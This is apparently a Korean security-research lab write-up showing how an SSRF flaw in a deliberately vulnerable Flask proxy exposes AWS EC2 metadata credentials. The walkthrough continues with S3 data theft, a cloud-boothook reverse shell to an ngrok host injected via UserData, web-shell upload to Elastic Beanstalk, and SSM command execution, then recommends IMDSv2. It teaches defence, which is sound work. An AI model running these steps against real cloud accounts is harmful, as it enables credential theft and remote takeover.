---
layout: post
title: "AWS Instance Meta-data SSRF to RCE"
author: "hzone"
comments: true
tags: [aws, ec2, ssrf]
---

라온화이트햇 핵심연구팀 홍지원

## 1. 개요

SSRF(Server-Side Request Forgery) 취약점을 이용해 AWS의 EC2 Instance Meta-data에 접근하고, 이로 인해 발생할 수 있는 공격과 대응방안에 대해서 작성하였습니다.

## 2. SSRF 취약점이란?

**SSRF(Server-Side Request Forgery) 취약점**은 공격자가 서버를 이용하여 직접 접근할 수 없는 내부 서버에 조작된 요청을 보내도록 하는 공격입니다. SSRF 공격의 일반적인 예 중 하나는 AWS의 EC2 Instance credentials에 대한 접근 권한을 얻는 것입니다. 

### 2.1 피해 사례

2019년, 미국과 캐나다에 걸쳐 약 1억 600만 명의 사용자에게 영향을 미친 캐피탈 원(Capital One) 데이터 침해 사건은 **SSRF 공격에 의해 발생**했습니다. 

캐피탈 원 사이트에서 SSRF 취약점이 존재했고, 해커는 이를 이용해 캐피탈 원의 **Instance Meta-data를 획득**할 수 있었습니다. Meta-data 안에는 **IAM Role(AccessKeyld, SecretAccessKey, Token 등)**이 포함되어 있으며 이 값을 이용하면 **S3 Storage에 접근**할 수 있어 해커는 그곳에 있는 고객 데이터를 다운로드 한 것으로 확인되었습니다.

## 3. AWS EC2 Meta-data 탈취

AWS의 EC2 Instance Meta-data는 실행 중인 Instance를 구성 또는 관리하는 데 사용될 수 있는 Instance 관련 데이터입니다. 

대부분의 AWS EC2 Instance Meta-data는 http://169.254.169.254를 통해 접근할 수 있습니다. 여기에는 IP 주소, 보안 그룹 이름 등과 같은 Instance에 대한 유용한 정보가 포함됩니다. 

해당 문서에 설명할 내용은 **Meta-data를 이용한 IAM Role 권한 획득**입니다. EC2 instance에 IAM Role을 할당되게 된다면, 이 Role이 갖게 되는 권한을 Instance Meta-data를 통해 획득할 수 있습니다. 

## 4. 실습

### 4.1 실습 환경 구축

- 실습을 위한 간단한 웹 페이지

![Untitled](/assets/2022-11-01/Untitled.png)

```python
from flask import Flask, request
import urllib
from urllib import parse

app = Flask(__name__)

@app.route("/go", methods=["GET"])
def route():
    url = request.args.get("url")

    if url:
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req) as response:
                data = response.read()
        except:
            return "Error"
        return data
    else:
        return "Require URL parameter."

app.run(host='0.0.0.0', port=5001)
```

### 4.2 **IAM Role credential 획득**

1. **meta-data 접근** : [http://43.200.141.64:5001/go?url=http://169.254.169.254/latest/meta-data](http://43.200.141.64:5001/go?url=http://169.254.169.254/latest/meta-data)

![Untitled](/assets/2022-11-01/Untitled%201.png)

→ iam 디렉토리가 없다면, Instance에 IAM Role을 할당했는지 확인 

2. **할당된 IAM Role 확인** : [http://43.200.141.64:5001/go?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://43.200.141.64:5001/go?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/hzone_role)

![Untitled](/assets/2022-11-01/Untitled%202.png)

3. **IAM 자격증명 정보 획득** : [http://43.200.141.64:5001/go?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/hzone_role](http://43.200.141.64:5001/go?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/hzone_role)

![Untitled](/assets/2022-11-01/Untitled%203.png)

→ AccessKeyId, SecretAccessKey, Token 값 획득

### 4.3 AWS CLI를 이용한 IAM Role 권한 탈취

1. **인증정보 설정** : `aws configure --profile [name]`

![Untitled](/assets/2022-11-01/Untitled%204.png)

2. **aws_session_token 삽입** : `/.aws/credentials 파일`

![Untitled](/assets/2022-11-01/Untitled%205.png)

3. **stolen_role credentials 유효성 확인** : `aws sts get-caller-identity --profile stolen_role`

![Untitled](/assets/2022-11-01/Untitled%206.png)

### 4.4 s3 storage 접근

AWS s3(Simple Storage Service) : 각족 이미지나 파일들을 저장할 수 있는 저장소

1. **s3 bucket 나열** : `aws s3 ls --profile stolen_role`

![Untitled](/assets/2022-11-01/Untitled%207.png)

2. **hzone-file 객체(파일) 나열** : `aws s3api list-object --bucket hzone-file --profile stolen_role`

![Untitled](/assets/2022-11-01/Untitled%208.png)

3. **flag.txt 파일 탈취** : `aws s3api get-object --bucket hzone-file --key credentials/flag.txt flag.txt --profile stolen_role`

![Untitled](/assets/2022-11-01/Untitled%209.png)

## 5. Instance UserData를 이용한 쉘 탈취

다음은 탈취한 인증 정보(stolen_role)를 이용해 Instance의 쉘을 탈취하는 공격입니다. 

Instance 사용자 데이터(UserData)는 instance를 중지한 후, 수정할 수 있습니다. instance의 사용자 데이터를 수정한 후, instance를 다시 시작할 때 업데이트된 사용자 데이터가 실행되도록 설정을 구성할 수 있습니다.  

따라서, 공격자는 사용자 데이터에 쉘 스크립트를 삽입하고 이를 실행시켜 Instance의 쉘을 탈취할 수 있습니다.

1. 앞서 탈취한 인증 정보(stolen_role)를 이용해 **Instance 중지**
    
    `aws ec2 stop-instances --instance-ids [instance-id] --profile stolen_role`
    
    ![Untitled](/assets/2022-11-01/Untitled%2010.png)
    
2. 1) 사용자 데이터에 삽입할 **쉘 스크립트 생성**
    
    ```bash
    #cloud-boothook
    #!/bin/bash
    bash -i >& /dev/tcp/0.tcp.jp.ngrok.io/19984 0>&1
    ```
    
    → Instance를 시작할 때마다 업데이트된 사용자 데이터가 자동으로 실행되지 않으므로, #cloud-boothook을 적어주어야 사용자 데이터가 실행됨
    
    **2) base64 인코딩** : `base64 rev_udata.sh > rev_udata64.sh`
    
3. **Instance 사용자 데이터 수정** : `aws ec2 modify-instance-attribute --instance-id=[instance-id] --attribute userData --value file://rev_udata64.sh --profile stolen_role`
4. **Instance 시작** : `aws ec2 start-instances --instance-ids [instance-id] --profile stolen_role`
    
    ![Untitled](/assets/2022-11-01/Untitled%2011.png)
    
5. **Instance 쉘 탈취 성공**
    
    ![Untitled](/assets/2022-11-01/Untitled%2012.png)
    

※ 앞서 탈취한 stolen_role의 IAM Role에 "ec2:Describe*", "ec2:StartInstances", "ec2:StopInstances", "ec2:ModifyInstanceAttribute" 권한이 있어야 공격 가능

## 6. 그 외 공격

### 1. AWS Elastic Beanstalk

AWS Elastic Beanstalk은 Java, .NET, PHP, Node.js, Python, Ruby, Go에서 개발된 웹 어플리케이션을 배포 및 확장하기 위해 AWS에서 제공하는 PaaS(Platform as a Service)입니다.

Elastic Beanstalk는 환경을 생성하는 각 리전에 대해 elasticbeanstalk-region-account-id라는 s3 bucket을 생성하는데, s3 bucket에 객체를 추가할 수 있는 권한이 있다면 웹쉘을 업로드할 수 있습니다. 

- bucket 리소스 나열 : `aws s3 ls s3://[elasticbeanstalk-region-account-id]/ --recursive`
- 웹쉘(cmd.php) 업로드 : `aws s3 cp cmd.php s3://[elasticbeanstalk-region-account-id]/`

웹쉘 업로드 및 실행에 성공한다면, 원격 코드 실행까지 이어질 수 있습니다.

### 2. AWS Systems Manager

[AWS Systems Manager(ssm)](https://docs.aws.amazon.com/cli/latest/reference/ssm/index.html#cli-aws-ssm)는 AWS 클라우드에서 실행되는 어플리케이션과 인프라를 관리하는데 도움이 되는 기능 모음입니다. ssm을 통해 사용 가능한 명령 중 send-command 명령어를 이용해 Instance에서 쉘 스크립트를 실행할 수 있습니다. 

사용 방법) [https://docs.aws.amazon.com/systems-manager/latest/userguide/walkthrough-cli.html#walkthrough-cli-example-1](https://docs.aws.amazon.com/systems-manager/latest/userguide/walkthrough-cli.html#walkthrough-cli-example-1)

- 명령 수행 권한 확인 : `aws ssm describe-instance-information --output text --query "InstanceInformationList[*]"`
- whoami 명령어 실행 : `aws ssm send-command --document-name "AWS-RunShellScript" --comment "RCE test: whoami" --targets "Key=instanceids,Values=[instance-id]" --parameters 'commands=whoami'`
- 명령어 실행 응답 확인 : `aws ssm list-command-invocations --command-id "[command-Id]" --details`

## 7. 대응방안

AWS의 EC2 Instance Meta-data 접근을 통해 IAM Role을 탈취하고, 이로 인해 발생할 수 있는 공격에 대해서 알아보았습니다. 

앞서 사용한 Instance Meta-data 접근 방법은 **IMDSv1**을 사용한 것입니다. IMDSv1는 정해진 Meta-data URL에 대해 GET 요청을 하면 누구나 Meta-data에  접근할 수 있기 때문에 SSRF와 같은 공격으로부터 취약합니다.

I**MDSv2**는 이를 개선한 방법으로 Meta-data에 GET 요청을 하기 전에 PUT 요청을 통해 Token을 발급받아야 하는 과정이 추가되었습니다. 즉, Instance Meta-data를 사용하려면 PUT 요청을 통해 Token을 발급받은 후, 발급받은 Token을 이용하여 GET 요청을 Meta-data URL로 전송하여야 합니다. 

따라서, IMDSv2를 사용하는 것이 보다 안전한 Instance Meta-data 이용 환경으로 볼 수 있으며, SSRF와 같은 취약점에 대응할 수 있는 방법이 될 수 있습니다. 



- **참고자료**
    
    [네이버클라우드 기술&경험]SSRF 공격의 피해 사례와 대응 #1](https://blog.naver.com/n_cloudplatform/221638724015)
    
    [https://hg8.sh/posts/bugbounty/ssrf-to-rce-aws/](https://hg8.sh/posts/bugbounty/ssrf-to-rce-aws/)
    
    [https://docs.aws.amazon.com/ko_kr/elasticbeanstalk/latest/dg/AWSHowTo.S3.html](https://docs.aws.amazon.com/ko_kr/elasticbeanstalk/latest/dg/AWSHowTo.S3.html)
    
    [https://notsosecure.com/exploiting-ssrf-aws-elastic-beanstalk](https://notsosecure.com/exploiting-ssrf-aws-elastic-beanstalk)
    
    [https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40](https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40)
    
    [https://cloudguardians.medium.com/ec2-instance-metadata-보안-edd23f56b64c](https://cloudguardians.medium.com/ec2-instance-metadata-%EB%B3%B4%EC%95%88-edd23f56b64c)